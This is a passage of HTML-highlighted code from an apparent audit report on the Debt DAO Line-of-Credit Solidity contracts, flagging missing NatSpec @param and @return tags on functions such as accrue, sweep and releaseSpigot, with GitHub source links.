class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">204       </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">205       </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">206     )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">207       </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">208:      </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (ILineOfCredit.Credit </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@param credit&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@param id&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@return&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">234     </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">235       * see ILineOfCredit._accrue</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">236       * </span><span class=\"mtk4\">@notice</span><span class=\"mtk3\"> called by LineOfCredit._accrue during every repayment function</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">237       * </span><span class=\"mtk4\">@param</span><span class=\"mtk3\"> </span><span class=\"mtk12\">interest</span><span class=\"mtk3\"> - interset rate contract used by line that will calculate interest owed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">238      */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">239     </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">accrue</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">240       ILineOfCredit.Credit </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">241       </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">242       </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">interest</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">243     )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">244       </span><span class=\"mtk11\">public</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">245:      </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (ILineOfCredit.Credit </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">)</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L120-L133\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L120-L133</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"98\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">EscrowLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@param self&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">28</span><span class=\"mtk1\">        </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">29         * </span><span class=\"mtk4\">@notice</span><span class=\"mtk3\"> updates the cratio according to the collateral value vs line value</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">30         * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\"> calls accrue interest on the line contract to update the latest interest payable</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">31         * </span><span class=\"mtk4\">@param</span><span class=\"mtk3\"> </span><span class=\"mtk12\">oracle</span><span class=\"mtk3\"> - address to call for collateral token prices</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">32         * </span><span class=\"mtk4\">@return</span><span class=\"mtk3\"> cratio - the updated collateral ratio in 4 decimals</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">33        */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">34</span><span class=\"mtk1\">:       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_getLatestCollateralRatio</span><span class=\"mtk1\">(</span><span class=\"mtk12\">EscrowState</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">self</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">oracle</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@param self&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">46</span><span class=\"mtk1\">        </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">47        * </span><span class=\"mtk4\">@notice</span><span class=\"mtk3\"> - Iterates over all enabled tokens and calculates the USD value of all deposited collateral</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">48        * </span><span class=\"mtk4\">@param</span><span class=\"mtk3\"> </span><span class=\"mtk12\">oracle</span><span class=\"mtk3\"> - address to call for collateral token prices</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">49        * </span><span class=\"mtk4\">@return</span><span class=\"mtk3\"> totalCollateralValue - the collateral&#39;s USD value in 8 decimals</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">50        */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">51</span><span class=\"mtk1\">:       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_getCollateralValue</span><span class=\"mtk1\">(</span><span class=\"mtk12\">EscrowState</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">self</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">oracle</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L28-L34\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L28-L34</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"99\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LineFactoryLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@param oracle&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@param arbiter&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">33</span><span class=\"mtk1\">        </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">34          </span><span class=\"mtk4\">@notice</span><span class=\"mtk3\"> sets up new line based of config of old line. Old line does not need to have REPAID status for this call to succeed.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">35          </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\"> borrower must call rollover() on `oldLine` with newly created line address</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">36          </span><span class=\"mtk4\">@param</span><span class=\"mtk3\"> </span><span class=\"mtk12\">oldLine</span><span class=\"mtk3\">  - line to copy config from for new line.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">37          </span><span class=\"mtk4\">@param</span><span class=\"mtk3\"> </span><span class=\"mtk12\">borrower</span><span class=\"mtk3\"> - borrower address on new line</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">38          </span><span class=\"mtk4\">@param</span><span class=\"mtk3\"> </span><span class=\"mtk12\">ttl</span><span class=\"mtk3\">      - set total term length of line</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">39          </span><span class=\"mtk4\">@return</span><span class=\"mtk3\"> newLine - address of newly deployed line with oldLine config</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">40         */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">41</span><span class=\"mtk1\">        </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">rolloverSecuredLine</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">42            </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">oldLine</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">43            </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">, </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">44            </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">oracle</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">45            </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">arbiter</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">46            </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ttl</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">47:       ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineFactoryLib.sol#L33-L47\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineFactoryLib.sol#L33-L47</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"100\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LineLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@return&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">32</span><span class=\"mtk1\">         * @</span><span class=\"mtk12\">param</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> </span><span class=\"mtk4\">of</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokens</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\"> </span><span class=\"mtk12\">send</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">33</span><span class=\"mtk1\">         */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">34</span><span class=\"mtk1\">        </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">sendOutTokenOrETH</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">35          </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">36          </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">37          </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">38        )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">39          </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">40:         </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@return&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">57         </span><span class=\"mtk4\">*</span><span class=\"mtk1\"> @</span><span class=\"mtk11\">param</span><span class=\"mtk1\"> </span><span class=\"mtk11\">amount</span><span class=\"mtk1\"> - </span><span class=\"mtk11\">amount</span><span class=\"mtk1\"> </span><span class=\"mtk11\">of</span><span class=\"mtk1\"> </span><span class=\"mtk11\">tokens</span><span class=\"mtk1\"> </span><span class=\"mtk11\">to</span><span class=\"mtk1\"> </span><span class=\"mtk11\">send</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">58         </span><span class=\"mtk4\">*</span><span class=\"mtk1\">/</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">59        </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">receiveTokenOrETH</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">60          </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">61          </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">62          </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">63        )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">64          </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">65:         </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@return&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">78         </span><span class=\"mtk4\">*</span><span class=\"mtk1\"> @</span><span class=\"mtk11\">param</span><span class=\"mtk1\"> </span><span class=\"mtk11\">token</span><span class=\"mtk1\"> - </span><span class=\"mtk11\">address</span><span class=\"mtk1\"> </span><span class=\"mtk11\">of</span><span class=\"mtk1\"> </span><span class=\"mtk11\">token</span><span class=\"mtk1\"> </span><span class=\"mtk11\">to</span><span class=\"mtk1\"> </span><span class=\"mtk11\">check</span><span class=\"mtk1\">. </span><span class=\"mtk11\">Denominations</span><span class=\"mtk1\">.</span><span class=\"mtk11\">ETH</span><span class=\"mtk1\"> </span><span class=\"mtk11\">for</span><span class=\"mtk1\"> </span><span class=\"mtk11\">raw</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">79        </span><span class=\"mtk4\">*</span><span class=\"mtk1\">/</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">80:       </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getBalance</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L32-L40\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L32-L40</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"101\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SpigotedLineLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@param spigot&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@param status&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@param defaultSplit&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">163</span><span class=\"mtk1\">       </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">164        * </span><span class=\"mtk4\">@notice</span><span class=\"mtk3\"> Changes the revenue split between a Borrower&#39;s treasury and the LineOfCredit based on line health, runs with updateOwnerSplit()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">165        * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\">    - callable `arbiter` + `borrower`</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">166        * </span><span class=\"mtk4\">@param</span><span class=\"mtk3\"> </span><span class=\"mtk12\">revenueContract</span><span class=\"mtk3\"> - spigot to update</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">167        * </span><span class=\"mtk4\">@return</span><span class=\"mtk3\"> whether or not split was updated</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">168        */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">169</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">updateSplit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">spigot</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">revenueContract</span><span class=\"mtk1\">, LineLib.STATUS </span><span class=\"mtk12\">status</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint8</span><span class=\"mtk1\"> </span><span class=\"mtk12\">defaultSplit</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@param spigot&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@param status&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@param borrower&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@param arbiter&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@param to&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">186</span><span class=\"mtk1\">       </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">187   </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">188      * </span><span class=\"mtk4\">@notice</span><span class=\"mtk3\"> -  Transfers ownership of the entire Spigot and its revenuw streams from its then Owner to either </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">189                   the Borrower (if a Line of Credit has been been fully repaid) or </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">190                   to the Arbiter (if the Line of Credit is liquidatable).</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">191      * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\">    - callable by anyone </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">192      * </span><span class=\"mtk4\">@return</span><span class=\"mtk3\"> - whether or not Spigot was released</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">193     */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">194</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">releaseSpigot</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">spigot</span><span class=\"mtk1\">, LineLib.STATUS </span><span class=\"mtk12\">status</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">arbiter</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@param to&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@param token&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@param amount&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@param status&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@param borrower&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@param arbiter&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">211</span><span class=\"mtk1\">     </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">212      * </span><span class=\"mtk4\">@notice</span><span class=\"mtk3\"> -  Sends any remaining tokens (revenue or credit tokens) in the Spigot to the Borrower after the loan has been repaid.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">213                -  In case of a Borrower default (loan status = liquidatable), this is a fallback mechanism to withdraw all the tokens and send them to the Arbiter</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">214                -  Does not transfer anything if line is healthy</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">215      * </span><span class=\"mtk4\">@return</span><span class=\"mtk3\"> - whether or not spigot was released</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">216     */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">217</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">sweep</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, LineLib.STATUS </span><span class=\"mtk12\">status</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">arbiter</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p><a 